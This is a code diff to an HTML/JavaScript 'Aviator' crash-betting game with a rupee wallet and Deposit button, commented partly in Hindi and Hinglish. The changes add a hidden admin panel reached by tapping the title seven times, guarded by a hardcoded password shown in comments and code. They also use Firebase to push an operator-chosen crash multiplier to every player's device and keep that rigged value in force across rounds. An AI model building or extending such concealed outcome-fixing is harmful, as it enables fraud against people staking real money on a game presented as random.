@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Aviator</title>
+<!-- Firebase SDKs for Realtime Server Sync across all phones -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <style>
 body {
   background-color: #0b0f19;
@@ -186,19 +189,19 @@ input {
 
 <div class="container">
   <div class="header-row">
-    <h2>Aviator</h2>
+    <h2 id="game-title" onclick="checkSecretTap()">Aviator</h2>
     <div>
       <span class="wallet-badge">₹<span id="av-bal">90398</span></span>
       <button class="dep-btn" onclick="window.location.href='index.html'">Deposit</button>
     </div>
   </div>
 
-  <!-- ADMIN CONTROL PANEL (Password: 78699)[span_3](start_span)[span_3](end_span) -->
+  <!-- ADMIN CONTROL PANEL (Password: 78699) -->
   <div id="aviator-admin-box" class="admin-inline-box">
-    <b style="color: #ff5252; font-size: 13px;">👑 एडमिन क्रैश कंट्रोल:</b>
+    <b style="color: #ff5252; font-size: 13px;">👑 एडमिन क्रैश कंट्रोल (Server Sync):</b>
     <input type="number" id="adm-crash-val" placeholder="उदा. 2.00" step="0.1" min="1.1" style="padding: 6px; font-size: 13px;">
     <div style="display: flex; gap: 5px; margin-top: 5px;">
-      <button class="big-bet-btn" style="padding: 6px; background: #00e676; color: #000; font-size: 12px; margin-top: 0;" onclick="saveAdminCrash()">लॉक करें</button>
+      <button class="big-bet-btn" style="padding: 6px; background: #00e676; color: #000; font-size: 12px; margin-top: 0;" onclick="saveAdminCrash()">सर्वर पर लॉक करें</button>
       <button class="big-bet-btn" style="padding: 6px; background: #555; color: #fff; font-size: 12px; margin-top: 0;" onclick="closeAviatorAdmin()">बंद</button>
     </div>
     <div id="adm-status-msg" style="color: #00e676; font-size: 11px; margin-top: 3px; font-weight: bold;"></div>
@@ -266,6 +269,13 @@ input {
 </div>
 
 <script>
+// --- FIREBASE CONFIGURATION (Yahan apna Firebase Realtime Database URL dalein) ---
+const firebaseConfig = {
+  databaseURL: "YOUR_FIREBASE_DATABASE_URL_HERE"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
 let walletBal = 90398;
 let currentMult = 1.00;
 let crashAt = 2.00;
@@ -279,11 +289,23 @@ let isPlaying1 = false, isPlaying2 = false;
 let betAmt1 = 0, betAmt2 = 0;
 let autoTarget1 = 2.00, autoTarget2 = 2.00;
 
+// 7-Tap Secret Counter
+let tapCount = 0;
+let tapTimer = null;
+
 window.onload = function() {
   let saved = localStorage.getItem('mahakal_master_wallet');
   if(saved !== null) walletBal = parseFloat(saved);
   document.getElementById('av-bal').innerText = walletBal;
   startBettingTimer();
+
+  // Listen to Server Realtime Updates for Crash Point
+  db.ref("aviatorServer/crashPoint").on("value", (snapshot) => {
+    let val = snapshot.val();
+    if(val !== null) {
+      forcedCrash = parseFloat(val);
+    }
+  });
 };
 
 function updateBal() {
@@ -293,6 +315,17 @@ function updateBal() {
 
 function setAmt(v) { document.getElementById('bet-input-1').value = v; }
 function setAmt2(v) { document.getElementById('bet-input-2').value = v; }
+
+function checkSecretTap() {
+  tapCount++;
+  clearTimeout(tapTimer);
+  tapTimer = setTimeout(() => { tapCount = 0; }, 1200);
+
+  if(tapCount >= 7) {
+    tapCount = 0;
+    openAdminPanel();
+  }
+}
 
 function startBettingTimer() {
   gameState = "BETTING";
@@ -333,7 +366,6 @@ function startFlight() {
   gameState = "FLYING";
   if(forcedCrash !== null) {
     crashAt = forcedCrash;
-    forcedCrash = null;
   } else {
     crashAt = parseFloat((Math.random() * 3.5 + 1.2).toFixed(2));
   }
@@ -458,7 +490,6 @@ function handleBet(panelNo) {
   }
 }
 
-// Fixed Admin Panel Function with .trim() to ignore keyboard trailing spaces
 function openAdminPanel() {
   let p = prompt("गुप्त एडमिन पासवर्ड दर्ज करें:");
   if(p !== null && p.trim() === "78699") {
@@ -477,11 +508,21 @@ function closeAviatorAdmin() {
 function saveAdminCrash() {
   let val = parseFloat(document.getElementById('adm-crash-val').value);
   if(!isNaN(val) && val >= 1.05) {
-    forcedCrash = val;
-    document.getElementById('adm-status-msg').innerText = `✅ क्रैश ${val}x पर लॉक हो गया!`;
-    setTimeout(() => {
-      closeAviatorAdmin();
-    }, 1500);
+    // Send value to Firebase Realtime Database so all users get it instantly
+    db.ref("aviatorServer").set({
+      crashPoint: val,
+      updatedAt: Date.now()
+    }, (error) => {
+      if(error) {
+        alert("Server par save karne mein error aayi!");
+      } else {
+        forcedCrash = val;
+        document.getElementById('adm-status-msg').innerText = `✅ क्रैश ${val}x पर सर्वर पर लॉक हो गया!`;
+        setTimeout(() => {
+          closeAviatorAdmin();
+        }, 1500);
+      }
+    });
   } else {
     alert("कृपया सही वैल्यू (उदा. 2.00) डालें!");
   }
